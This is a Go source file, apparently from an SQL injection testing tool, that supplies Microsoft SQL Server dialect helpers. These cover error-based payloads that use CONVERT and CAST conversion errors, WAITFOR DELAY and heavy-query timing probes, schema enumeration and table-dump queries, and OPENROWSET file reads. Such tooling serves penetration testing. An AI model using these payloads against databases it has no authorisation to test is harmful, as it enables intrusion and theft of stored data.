package dbms

import (
	"fmt"
	"strings"
)

// MSSQL implements the DBMS interface for Microsoft SQL Server.
type MSSQL struct{}

// Name returns the canonical DBMS name.
func (m *MSSQL) Name() string { return "MSSQL" }

// --- String operations ---

// Concatenate returns MSSQL string concatenation using the + operator.
func (m *MSSQL) Concatenate(parts ...string) string {
	return strings.Join(parts, "+")
}

// Substring returns a MSSQL SUBSTRING(expr, start, length) expression.
func (m *MSSQL) Substring(expr string, start, length int) string {
	return fmt.Sprintf("SUBSTRING(%s,%d,%d)", expr, start, length)
}

// Length returns a MSSQL LEN(expr) expression.
// Note: LEN() does not count trailing spaces; DATALENGTH() does.
func (m *MSSQL) Length(expr string) string {
	return fmt.Sprintf("LEN(%s)", expr)
}

// ASCII returns a MSSQL ASCII(expr) expression.
func (m *MSSQL) ASCII(expr string) string {
	return fmt.Sprintf("ASCII(%s)", expr)
}

// Char returns a MSSQL CHAR(code) expression.
func (m *MSSQL) Char(code int) string {
	return fmt.Sprintf("CHAR(%d)", code)
}

// --- Version and identity ---

// VersionQuery returns the MSSQL expression to retrieve the server version.
func (m *MSSQL) VersionQuery() string { return "@@version" }

// CurrentUserQuery returns the MSSQL expression to retrieve the current user.
func (m *MSSQL) CurrentUserQuery() string { return "SYSTEM_USER" }

// CurrentDBQuery returns the MSSQL expression to retrieve the current database.
func (m *MSSQL) CurrentDBQuery() string { return "DB_NAME()" }

// HostnameQuery returns the MSSQL expression to retrieve the server name.
func (m *MSSQL) HostnameQuery() string { return "@@SERVERNAME" }

// --- Enumeration queries ---

// ListDatabasesQuery returns a SQL query to list all databases.
func (m *MSSQL) ListDatabasesQuery() string {
	return "SELECT name FROM master..sysdatabases"
}

// ListTablesQuery returns a SQL query to list all user tables in the given database.
func (m *MSSQL) ListTablesQuery(database string) string {
	return fmt.Sprintf(
		"SELECT table_name FROM %s.information_schema.tables WHERE table_type='BASE TABLE'",
		database,
	)
}

// ListColumnsQuery returns a SQL query to list all columns in the given table.
func (m *MSSQL) ListColumnsQuery(database, table string) string {
	return fmt.Sprintf(
		"SELECT column_name FROM %s.information_schema.columns WHERE table_name='%s'",
		database, table,
	)
}

// CountRowsQuery returns a SQL query to count rows in the given table.
func (m *MSSQL) CountRowsQuery(database, table string) string {
	return fmt.Sprintf("SELECT COUNT(*) FROM %s.dbo.%s", database, table)
}

// DumpQuery returns a SQL query to dump rows from the given table.
// MSSQL uses TOP + ROW_NUMBER() for pagination instead of LIMIT/OFFSET.
func (m *MSSQL) DumpQuery(database, table string, columns []string, offset, limit int) string {
	cols := strings.Join(columns, ",")
	return fmt.Sprintf(
		"SELECT %s FROM (SELECT %s, ROW_NUMBER() OVER (ORDER BY (SELECT NULL)) AS rn FROM %s.dbo.%s) t WHERE rn>%d AND rn<=%d",
		cols, cols, database, table, offset, offset+limit,
	)
}

// --- Error-based payloads ---

// ErrorPayloads returns MSSQL-specific error-based injection payload templates.
// MSSQL raises a type-conversion error that includes the value being converted.
func (m *MSSQL) ErrorPayloads() []PayloadTemplate {
	return []PayloadTemplate{
		{
			Name:     "convert",
			Template: "CONVERT(INT,({{.Query}}))",
			Columns:  1,
			DBMS:     "MSSQL",
		},
		{
			Name:     "cast",
			Template: "CAST(({{.Query}}) AS INT)",
			Columns:  1,
			DBMS:     "MSSQL",
		},
	}
}

// --- Time-based ---

// SleepFunction returns a MSSQL WAITFOR DELAY expression.
// WAITFOR DELAY 'hh:mm:ss' pauses execution for the specified time.
func (m *MSSQL) SleepFunction(seconds int) string {
	h := seconds / 3600
	min := (seconds % 3600) / 60
	s := seconds % 60
	return fmt.Sprintf("WAITFOR DELAY '%d:%02d:%02d'", h, min, s)
}

// HeavyQuery returns a CPU-intensive query for time-based detection without WAITFOR.
func (m *MSSQL) HeavyQuery() string {
	return "SELECT COUNT(*) FROM sysusers A, sysusers B, sysusers C"
}

// --- Boolean constructs ---

// IfThenElse returns a MSSQL CASE WHEN ... THEN ... ELSE ... END expression.
func (m *MSSQL) IfThenElse(condition, trueExpr, falseExpr string) string {
	return fmt.Sprintf("CASE WHEN %s THEN %s ELSE %s END", condition, trueExpr, falseExpr)
}

// --- Quoting and comments ---

// QuoteString wraps the string in single quotes, escaping embedded single quotes.
func (m *MSSQL) QuoteString(s string) string {
	escaped := strings.ReplaceAll(s, "'", "''")
	return fmt.Sprintf("'%s'", escaped)
}

// CommentSequence returns the MSSQL line comment sequence.
func (m *MSSQL) CommentSequence() string { return "-- " }

// InlineComment returns the MSSQL block comment syntax.
func (m *MSSQL) InlineComment() string { return "/**/" }

// --- File operations ---

// FileReadQuery returns an expression to read a file via OPENROWSET.
// This requires specific permissions and is disabled by default in most setups.
func (m *MSSQL) FileReadQuery(path string) string {
	return fmt.Sprintf(
		"SELECT BulkColumn FROM OPENROWSET(BULK '%s', SINGLE_BLOB) AS x",
		strings.ReplaceAll(path, "'", "''"),
	)
}

// --- Capabilities ---

// Capabilities returns the feature set supported by MSSQL.
func (m *MSSQL) Capabilities() Capabilities {
	return Capabilities{
		StackedQueries: true,
		ErrorBased:     true,
		UnionBased:     true,
		FileRead:       false, // requires xp_cmdshell or OPENROWSET; disabled by default
		FileWrite:      false,
		OSCommand:      false, // xp_cmdshell; disabled by default
		OutOfBand:      false,
		Subqueries:     true,
		CaseWhen:       true,
		LimitOffset:    false, // MSSQL uses TOP/ROW_NUMBER() instead
	}
}
